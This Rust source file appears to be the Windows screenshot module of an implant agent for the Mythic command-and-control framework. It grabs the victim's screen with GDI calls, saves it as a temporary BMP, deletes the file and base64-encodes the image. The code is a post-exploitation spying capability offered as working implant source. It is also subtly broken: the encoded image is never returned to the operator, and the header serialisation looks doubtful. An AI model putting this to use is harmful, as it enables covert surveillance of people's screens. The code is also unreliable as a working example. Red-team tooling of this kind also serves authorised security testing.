use crate::{AgentTask, mythic_success, mythic_error};
use crate::agent::ScreenshotArgs;
use base64::{Engine as _, engine::general_purpose};
use std::error::Error;
use std::result::Result;

#[cfg(target_os = "windows")]
use std::{fs, ptr};
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{DWORD, UINT};
#[cfg(target_os = "windows")]
use winapi::shared::windef::{HBITMAP, HDC, HWND};
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

/// Take a screenshot of the primary screen using WinAPI GDI functions
#[cfg(target_os = "windows")]
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    unsafe {
        let hwnd_desktop: HWND = GetDesktopWindow();
        let hdc_screen: HDC = GetDC(hwnd_desktop);
        if hdc_screen.is_null() {
            return Err(format!("Failed to get screen DC. Error: {}", GetLastError()).into());
        }

        let hdc_mem: HDC = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to create memory DC. Error: {}", GetLastError()).into());
        }

        // Get screen size
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        let hbitmap: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbitmap.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("Failed to create compatible bitmap. Error: {}", GetLastError()).into());
        }

        SelectObject(hdc_mem, hbitmap as *mut _);
        if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(hwnd_desktop, hdc_screen);
            return Err(format!("BitBlt failed. Error: {}", GetLastError()).into());
        }

        // Save screenshot to a temporary .bmp file
        let temp_path = std::env::temp_dir().join("screenshot.bmp");
        save_bitmap_to_file(hbitmap, width as u32, height as u32, &temp_path)?;

        // Cleanup
        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(hwnd_desktop, hdc_screen);

        // Read BMP bytes
        let screenshot_data = fs::read(&temp_path)?;
        let _ = fs::remove_file(&temp_path);

        // Encode to base64
        let encoded_data = general_purpose::STANDARD.encode(&screenshot_data);

        Ok(mythic_success!(
            task.id,
            format!(
                "Screenshot captured successfully ({} bytes, base64 length {}).",
                screenshot_data.len(),
                encoded_data.len()
            )
        ))
    }
}

/// Helper function: Save an HBITMAP to a .bmp file
#[cfg(target_os = "windows")]
unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &std::path::Path) -> Result<(), Box<dyn Error>> {
    use std::fs::File;
    use std::io::Write;

    let mut bmp_file_header = BITMAPFILEHEADER {
        bfType: 0x4D42, // 'BM'
        bfSize: 0,
        bfReserved1: 0,
        bfReserved2: 0,
        bfOffBits: std::mem::size_of::<BITMAPFILEHEADER>() as u32
            + std::mem::size_of::<BITMAPINFOHEADER>() as u32,
    };

    let mut bmp_info_header = BITMAPINFOHEADER {
        biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
        biWidth: width as i32,
        biHeight: height as i32,
        biPlanes: 1,
        biBitCount: 24,
        biCompression: BI_RGB,
        biSizeImage: 0,
        biXPelsPerMeter: 0,
        biYPelsPerMeter: 0,
        biClrUsed: 0,
        biClrImportant: 0,
    };

    let row_size = ((bmp_info_header.biBitCount as u32 * width + 31) / 32) * 4;
    let image_size = row_size * height;
    bmp_info_header.biSizeImage = image_size;

    bmp_file_header.bfSize = bmp_file_header.bfOffBits + image_size;

    let mut buffer = vec![0u8; image_size as usize];
    let hdc = GetDC(ptr::null_mut());
    GetDIBits(
        hdc,
        hbitmap,
        0,
        height as u32,
        buffer.as_mut_ptr() as *mut _,
        &mut BITMAPINFO {
            bmiHeader: bmp_info_header,
            bmiColors: [RGBQUAD {
                rgbBlue: 0,
                rgbGreen: 0,
                rgbRed: 0,
                rgbReserved: 0,
            }],
        },
        DIB_RGB_COLORS,
    );
    ReleaseDC(ptr::null_mut(), hdc);

    // Write BMP to file
    let mut file = File::create(path)?;
    file.write_all(bytemuck::bytes_of(&bmp_file_header))?;
    file.write_all(bytemuck::bytes_of(&bmp_info_header))?;
    file.write_all(&buffer)?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn take_screenshot(_task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Err("Screenshot functionality is only supported on Windows".into())
}
